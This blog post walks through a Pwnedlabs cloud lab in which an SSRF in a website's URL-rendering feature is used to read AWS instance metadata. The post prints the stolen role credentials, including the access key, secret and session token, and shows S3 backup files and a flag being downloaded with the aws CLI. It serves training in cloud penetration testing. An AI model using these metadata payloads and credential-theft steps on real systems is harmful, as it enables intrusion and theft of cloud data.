---
author: Nithissh S
pubDatetime: 2024-02-28
modDatetime: 2024-02-28
title: SSRF to Pwned - Pwnedlabs walkthrough
slug: ssrf-to-pwned
featured: false
draft: false
tags:
  - Pwnedlabs
  - Cloud Pentest
description:
  In this Blog, we will go enumeration process and also understand how we exploited this simple SSRF vulnerability
---


As an initial entry point, we have been provided with the following details

  

|     |     |
| --- | --- |
| Type | Value |
| IP Address | 52.6.119.121<br> |

  

The scenario here is Rumors are swirling on hacker forums about a potential breach at Huge Logistics. Your team has been monitoring these conversations closely, and Huge Logistics has asked you to assess the security of their website. Beyond the surface-level assessment, you're also to investigate links to their cloud infrastructure, mapping out any potential risk exposure. The question isn't just if they've been compromised, but how deep the rabbit hole goes.

  

## Solution

Adding the following IP Address `52.6.119.121`  in `/etc/hosts`  and pointing to `hugelogistics.pwn` 

  

```
nits@FWS-CHE-LT-8869 workflows % cat /etc/hosts
##
# Host Database
#
# localhost is used to configure the loopback interface
# when the system is booting.  Do not change this entry.

52.6.119.121             hugelogistics.pwn
```

  

Opening the IP Address in the browser and by the look of website, It looks like this website themed as offering logistics server for transporting goods and services 

  

![](../../assets/images/ssrf-1.png)

  

There is an additional functionality in the single page application, where you can put any domain name on to the input field let’s assume `example.com` and it renders out the content of actual `example.com` website and present it here

  

![](../../assets/images/ssrf-2.png)

  

One more thing to note, In order to exploit a SSRF we need to know which cloud platform being utilised it may be Azure, AWS or even GCP and for that, we can look into the source of website and look for how images are being imported here... In our case, It is Amazon s3 with the bucket named `huge-logistics-storage` 

  

![](../../assets/images/ssrf-3.png) 

  

Coming back to the service status page, with the following AWS metadata address payload `169.254.169.254/latest/meta-data`  prints out folder paths and confirms that there is a SSRF vulnerability exists

  

![](../../assets/images/ssrf-4.png) 

  

With the complete payload which is `169.254.169.254/latest/meta-data/iam/security-credentials/MetapwnedS3Access`  we can able to view the credentials belongs to user or role ( we need to determine it later may be ) called `MetapwnedS3Access` 

  

![](../../assets/images/ssrf-5.png)  

  

Configured the Access keys, Secret Access key and session token into a profile called `MetaPwnedS3Access` 

  

```
nits@FWS-CHE-LT-8869 workflows % aws configure --profile MetaPwnedS3Access
AWS Access Key ID [None]: ASIARQVIRZ4UGCCA3VI4
AWS Secret Access Key [None]: ndXnBFVDFKQ2m8khrB5HaNnSdt2DxIKdrJepQ3wH
Default region name [None]: us-east-1
Default output format [None]: 
nits@FWS-CHE-LT-8869 workflows % aws s3 ls s3://huge-logistics-storage --profile MetaPwnedS3Access

An error occurred (InvalidAccessKeyId) when calling the ListObjectsV2 operation: The AWS Access Key Id you provided does not exist in our records.
nits@FWS-CHE-LT-8869 workflows % aws s3 ls s3://huge-logistics-storage --profile MetaPwnedS3Access

An error occurred (InvalidAccessKeyId) when calling the ListObjectsV2 operation: The AWS Access Key Id you provided does not exist in our records.
nits@FWS-CHE-LT-8869 workflows % aws configure set aws_session_token "IQoJb3JpZ2luX2VjEAIaCXVzLWVhc3QtMSJGMEQCIH6SfSiAgIOMK2PbNhLZlrFqYj33spnS7tBgonRuDXdQAiA/ui1uojX6XGGYP9n+3GIbd6Qu/lHxoE/do8G1PKr71CrEBQjq//////////8BEAAaDDEwNDUwNjQ0NTYwOCIMOwXoH9qAUQt5m9huKpgFmWO+XhlF8AixBLp4bld18RLMuQ35bGK387Gr5mhPg6Xb50ZCrTIMpi3VAS/EEw1l7szeDSm67JRisb62C8tyi2cAo8KqhbeoLkexVfIzA0NhF89WrKFWA1ZPOtvN/ML7SpDF0gwp3pJDkxCVJWfPtYW7gTFGYeVzQZyYiO3cwBS+yZb3OoWwF1NsMP9QJ7hUYRkMXwA9HISyzlzeUUXl2/gxE/VUCgnioI5DGDwIoCmtbDnlm678kFj25/fTH+4HEcxeKkvpoQNxhfWj5y0+68zy1bjQsghydRB+2trkeKApFbN8pjQVc7Uj7nYOXKbjJKTsKnAb/bS46qxkXHlty9e2friupcvRhTVagAXJvxUFT9wDAZokhorsYMABEvQL6y54g4IyxDQmCz/YSb6hSjiSVNLm1JFC7OJpsGN6sKwom/Pm8IRq5/qdNhoZqolBIVdk8QouHLX4iDcrQ8sCQV9pZFBOOC+MyMzSv47+FrI54VzgjpZURbEeBhq3rt3429aFde0E2zL5rhv1ieZsL0jfZid3XhvbO84/E55iSaazCXF4wVWFq6QJFkzik06fh5IJ5aBjcl4WmLEeyXCcoZic/caF8rYV364wQgLinPOS58NQGmCAy8oSYW17AuLIoV4u76J44imXOKWNEeGuK1gjrr4nB3hrQvmViVkji4Rz2mq2pIYVjTfNnURrbnDXPxb1iHGynlNcUp9srD5RKn0lNG+ZjdUyApJvBzb0rKnm+AhYgBpuQaUJ2t3ZuwP0jimcExX4oi+fjaMApjeRs6f2dApMqkfeo8g0tiWr2HHe7ZsW8NbHfM94F+kxQ3ZuifdqnL/LQ+LXbYREljVzGyMVqjs2+RNeoYFeU0eUXjLF5AG0A5ohiTDC9PuuBjqyAfvQE3H2SGYEmK4ccVEzcoLR6BRj6XMJM16Dj5uKP22qtzYy28zKmwJN+Y7fgVmVvPr4IbFZzVa+5ytG4XWfIHFCeddmj9fVLjvJ9nYHon75jqqrQidcCudrVdsirOaNM4l3qce/T26C9jRWRF1vosxCotJcZMQR978cevIJRGRrxfZd4TDkWP2RvXZnmHVQeaOUsomlDJSJP+EK9OFYkdKRl/cHRuYzXwR0CVsLp9O0x1U=" --profile MetaPwnedS3Access
```

  

This credentials which we got through the SSRF vulnerability as a assumed role named `MetaPwnedS3Access` 

  

```
nits@FWS-CHE-LT-8869 workflows % aws sts get-caller-identity --profile MetaPwnedS3Access
{
    "UserId": "AROARQVIRZ4UCHIUOGHDS:i-0199bf97fb9d996f1",
    "Account": "104506445608",
    "Arn": "arn:aws:sts::104506445608:assumed-role/MetapwnedS3Access/i-0199bf97fb9d996f1"
}
```

  

And now we can able to download the files from the following s3 bucket `huge-logistics-storage` 

  

```
nits@FWS-CHE-LT-8869 /tmp % aws s3 sync  s3://huge-logistics-storage/backup/ ./ --profile MetaPwnedS3Access 
warning: Skipping file /private/tmp/.s.PGSQL.5432. File is character special device, block special device, FIFO, or socket.
warning: Skipping file /private/tmp/com.apple.launchd.FLMR0fv9yO/Listeners. File is character special device, block special device, FIFO, or socket.
download: s3://huge-logistics-storage/backup/cc-export2.txt to ./cc-export2.txt
download: s3://huge-logistics-storage/backup/flag.txt to ./flag.txt
nits@FWS-CHE-LT-8869 /tmp % cat flag.txt
282f08a114b4b4f2d345100db48c7110%                                                                                                                                                         nits@FWS-CHE-LT-8869 /tmp % 
```
